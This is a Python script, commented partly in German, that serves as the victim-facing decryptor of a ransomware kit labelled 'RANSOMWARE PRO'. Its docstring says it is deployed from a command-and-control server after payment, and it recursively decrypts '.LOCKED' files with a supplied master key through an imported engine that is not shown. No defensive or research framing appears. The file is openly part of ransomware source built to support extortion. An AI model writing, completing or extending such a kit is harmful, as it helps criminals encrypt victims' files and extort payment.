#!/usr/bin/env python3
"""
DECRYPTOR TOOL
==============
Standalone Decryption Tool für Victim
Wird nach Payment vom C2 Server deployed
"""

import sys
import os
import json
from pathlib import Path
from datetime import datetime
from decryption_engine import DecryptionEngine

def main():
    print("""
╔════════════════════════════════════════════════════════════╗
║           DECRYPTION TOOL - RANSOMWARE PRO                ║
║         Payment Verified - Files Decryption Active         ║
╚════════════════════════════════════════════════════════════╝
    """)
    
    # Parse Arguments
    if len(sys.argv) < 3:
        print("[!] Usage: python decryptor.py <master_key_hex> <directory>")
        print("\nExample:")
        print("  python decryptor.py \"...base64key...\" C:\\Users\\Desktop\\TestFiles")
        sys.exit(1)
    
    master_key_hex = sys.argv[1]
    target_dir = sys.argv[2]
    
    target_path = Path(target_dir)
    
    if not target_path.exists():
        print(f"[!] Directory not found: {target_dir}")
        sys.exit(1)
    
    # Initialisiere Decryption Engine
    print(f"[*] Initializing Decryption Engine...")
    print(f"[*] Master Key: {master_key_hex[:20]}...")
    
    try:
        engine = DecryptionEngine(
            master_key_hex=master_key_hex,
            pbkdf2_iterations=100000
        )
    except ValueError as e:
        print(f"[!] Invalid master key: {e}")
        sys.exit(1)
    
    print(f"[*] Extension to decrypt: .LOCKED")
    print()
    
    # Entschlüssele Verzeichnis
    print(f"[*] Scanning directory: {target_dir}")
    print(f"[*] Looking for encrypted files (.LOCKED)...")
    print()
    
    success = engine.decrypt_directory(
        target_path,
        encryption_extension=".LOCKED",
        recursive=True,
        verbose=True
    )
    
    if not success:
        print("[!] No encrypted files found!")
        sys.exit(1)
    
    # Status Report
    status = engine.get_status_report()
    
    print("\n" + "="*60)
    print("DECRYPTION COMPLETE")
    print("="*60)
    print(f"Files decrypted: {status['decrypted_count']}")
    print(f"Failed: {status['failed_count']}")
    print()
    
    if status['failed_count'] > 0:
        print("Failed files:")
        for failed_file in status['failed_files']:
            print(f"  - {failed_file}")
        print()
    
    print("Your files have been restored!")
    print("="*60)

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
